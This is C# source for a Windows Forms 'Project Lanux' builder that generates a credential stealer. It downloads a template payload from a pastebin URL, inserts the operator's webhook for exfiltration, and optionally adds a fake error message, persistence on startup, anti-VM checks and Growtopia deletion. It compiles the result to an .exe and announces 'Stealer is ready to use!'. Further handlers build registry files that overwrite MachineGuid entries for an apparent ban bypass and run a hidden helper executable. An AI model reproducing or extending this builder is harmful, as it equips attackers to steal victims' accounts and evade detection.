using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Net;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Text.RegularExpressions;

namespace Project_Lanux
{
    public partial class Form1 : MetroFramework.Forms.MetroForm
    {
        List<string> alldata { get; set; }
        string IcoFilePath { get; set; }

        public Form1()
        {
            InitializeComponent();
        }




        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void metroButton1_Click(object sender, EventArgs e)
        {
            {
                string sourcelink = ("https://pastebin.com/raw/4xGmFS65");
                WebClient wc = new WebClient();
                string building = wc.DownloadString(sourcelink);
                building = building.Replace("webhook_url", metroTextBox9.Text);





                if (metroCheckBox14.Checked)
                {
                    building = building.Replace("//FakeErrorMessage", "MessageBox.Show(" + '"' + metroTextBox9.Text + '"' + "," + metroTextBox10.Text + ",MessageBoxButtons.OK);");
                }
                if (metroCheckBox17.Checked)
                {
                    building = building.Replace("//Tracer", "Tracer.TraceSave();");
                }
                if (metroCheckBox17.Checked)
                {
                    building = building.Replace("//RunOnStartup", "RunOnStartup();");
                }
                if (metroCheckBox16.Checked == true)
                {
                    building = building.Replace("//Tracer", "Tracer.TraceSave();");
                }
                if (metroCheckBox15.Checked == true)
                {
                    building = building.Replace("//DeleteGrowtopia", "DeleteGrowtopia();");
                }


                if (metroCheckBox13.Checked == true)
                {
                    building = building.Replace("//AntiVM", "AntiVM();");
                    building = building.Replace("//[AntiVM]", "");
                }





                SaveFileDialog sfd = new SaveFileDialog();
                sfd.FileName = metroTextBox10.Text + ".exe";
                sfd.Filter = "Exe files  (*.exe)|*.exe";
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    new Compiler(building, sfd.FileName);
                }
            }
        }


        public class Compiler
        {
            public Compiler(string sourceCode, string savePath)
            {

                string[] referencedAssemblies = new string[] { "System.dll", "System.Windows.Forms.dll", "System.Net.dll", "System.Drawing.dll", "System.Management.dll", "System.IO.dll", "System.IO.compression.dll", "System.IO.compression.filesystem.dll", "System.Core.dll", "System.Security.dll", "System.Net.Http.dll" };

                Dictionary<string, string> providerOptions = new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } };

                string compilerOptions = "/target:winexe /platform:anycpu /optimize+";

                using (CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider(providerOptions))
                {
                    CompilerParameters compilerParameters = new CompilerParameters(referencedAssemblies)
                    {
                        GenerateExecutable = true,
                        GenerateInMemory = false,
                        OutputAssembly = savePath, // output path
                        CompilerOptions = compilerOptions,
                        TreatWarningsAsErrors = false,
                        IncludeDebugInformation = false,
                    };

                    CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, sourceCode); // source.cs
                    if (compilerResults.Errors.Count > 0)
                    {
                        foreach (CompilerError compilerError in compilerResults.Errors)
                        {
                            MessageBox.Show(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
                                compilerError.Line, compilerError.Column, compilerError.FileName));
                        }

                    }
                    else
                    {
                        MessageBox.Show("Stealer is ready to use!");
                    }
                    return;
                }

            }
        }




        private void metroButton2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("fixing builder so this is disabled for now");
        }

        private void metroButton3_Click(object sender, EventArgs e)
        {
            MessageBox.Show(metroTextBox9.Text);
        }

        private void metroButton2_Click_1(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                string[] BindedFileInfo = { ofd.FileName, "false" };
                ListViewItem BindedList = new ListViewItem(BindedFileInfo);
                metroListView3.Items.Add(BindedList);
            }
            else
            {
                return;
            }
        }

        private void metroButton4_Click(object sender, EventArgs e)
        {
            try
            {
                if (metroListView3.SelectedItems[0].SubItems[1].Text == "true")
                {
                    metroListView3.SelectedItems[0].SubItems[1].Text = "false";
                }
                else if (metroListView3.SelectedItems[0].SubItems[1].Text == "false")

                {
                    metroListView3.SelectedItems[0].SubItems[1].Text = "true";
                }
            }
            catch { }
        }

        private void metroButton5_Click(object sender, EventArgs e)
        {
            if (metroListView3.Items.Count > 0)
            {
                try
                {
                    if (metroListView3.Items.Count > 0)
                    {
                        try
                        {
                            metroListView3.SelectedItems[0].Remove();
                        }
                        catch { }
                    }
                    metroListView3.SelectedItems[0].Remove();
                }
                catch { }
            }
        }










        private void Form1_Load(object sender, EventArgs e)
        {

        }




        private void metroButton18_Click(object sender, EventArgs e)
        {
            if (metroTextBox16.Text != "")
            {
                // [Reg string]==[Path]==
                string RegString = metroTextBox16.Text;
                string command = "[" + RegString + "]==[";
                string Path = Directory.GetCurrentDirectory() + "\\AAP-Bypass.reg";
                command += Path + "]==";
                command = command.Replace(" ", "[SPACE]");
                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "cmd /c " + @"C: \Users\" + Environment.UserName + @"\OneDrive\Desktop\Project Lanux\items\lanuxlc.exe" + command;
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
                p.Start();
                p.WaitForExit();
                MessageBox.Show("Reg file created!");
            }
            else
            {
                MessageBox.Show("Input registry string");
            }
        }
        public static string CreateReg(string FiveRND, string NineRND, string FiveRands, string NineRands, string MGUID1, string MGUID2)
        {
            string RegCode = string.Join(Environment.NewLine,
                "Windows Registry Editor Version 5.00",
                "[-HKEY_CURRENT_USER\\" + NineRND + "]", "[HKEY_CURRENT_USER\\" + NineRND + "]",
                NineRands,
                "",
                "[-HKEY_CURRENT_USER\\Software\\Microsoft\\" + FiveRND + "]",
                "[HKEY_CURRENT_USER\\Software\\Microsoft\\" + FiveRND + "]",
                FiveRands,
                "",
                "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography]",
                "\"MachineGuid\"=\"" + MGUID1 + "\"",
                "",
                "[HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography]",
                "\"MachineGuid\"=\"" + MGUID2 + "\"");
            return RegCode;
        }
        public static List<string> rand9list(string rands9, string[] listggg9)
        {
            List<string> listxd = new List<string>();
            RegistryKey strchange26;
            if (Environment.Is64BitOperatingSystem)
            {
                strchange26 = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry64);
            }
            else
            {
                strchange26 = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry32);
            }
            try
            {
                strchange26 = strchange26.OpenSubKey(rands9, true);
                string[] strchange27 = strchange26.GetValueNames();
                for (int i = 0; i < listggg9.Length; i++)
                {
                    byte[] strchange29 = (byte[])strchange26.GetValue(strchange27[i]);
                    string strchange30 = BitConverter.ToString(strchange29).Replace("-", ",").ToLower();
                    string strchange32 = @"""" + listggg9[i] + @"""=hex:" + strchange30 + Environment.NewLine;
                    listxd.Add(strchange32);
                }
            }
            catch
            {

            }
            return listxd;
        }
        public static string Formatfff = @"[^a-zA-Z0-9`!@#$%^&*()_+|\-=\\{}\[\]:"";'<>?,./]";

        private void metroButton19_Click(object sender, EventArgs e)
        {
            string MACAddress = metroTextBox16.Text;
            MACAddress = MACAddress.Replace("-", "");
            if (MACAddress == "")
            {
                MessageBox.Show("Invalid MAC");
                return;
            }
            if (MACAddress.Length != 12)
            {
                MessageBox.Show("Invalid MAC");
                return;
            }
            string command = "[" + MACAddress + "]==";
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "cmd /c " + @"C: \Users\" + Environment.UserName + @"\OneDrive\Desktop\Project Lanux\items\lanuxlc.exe" + command;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
            p.Start();
            p.WaitForExit();
            MessageBox.Show("Done!");
        }



        private void metroLabel5_Click(object sender, EventArgs e)
        {

        }

        private void metroPanel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void tabPage2_Click(object sender, EventArgs e)
        {

        }

        private void metroButton1_Click_1(object sender, EventArgs e)
        {
            metroPanel5.Visible = false;
            metroPanel7.Visible = true;
        }

        private void metroButton2_Click_2(object sender, EventArgs e)
        {
            metroPanel5.Visible = true;
            metroPanel7.Visible = false;
        }

        private void metroButton19_Click_1(object sender, EventArgs e)
        {
            string MACAddress = metroTextBox16.Text;
            MACAddress = MACAddress.Replace("-", "");
            if (MACAddress == "")
            {
                MessageBox.Show("Invalid MAC");
                return;
            }
            if (MACAddress.Length != 12)
            {
                MessageBox.Show("Invalid MAC");
                return;
            }
            string command = "[" + MACAddress + "]==";
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "cmd /c " + @"C: \Users\" + Environment.UserName + @"\OneDrive\Desktop\Project Lanux\items\lanuxlc.exe" + command;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
            p.Start();
            p.WaitForExit();
            MessageBox.Show("Done!");
        }

        private void metroButton18_Click_1(object sender, EventArgs e)
        {
            if (metroTextBox16.Text != "")
            {
                // [Reg string]==[Path]==
                string RegString = metroTextBox16.Text;
                string command = "[" + RegString + "]==[";
                string Path = Directory.GetCurrentDirectory() + "\\AAP-Bypass.reg";
                command += Path + "]==";
                command = command.Replace(" ", "[SPACE]");
                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "cmd /c " + @"C: \Users\" + Environment.UserName + @"\OneDrive\Desktop\Project Lanux\items\lanuxlc.exe" + command;
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
                p.Start();
                p.WaitForExit();
                MessageBox.Show("Reg file created!");
            }
            else
            {
                MessageBox.Show("Input registry string");
            }
        }



    }
}

        
        
  








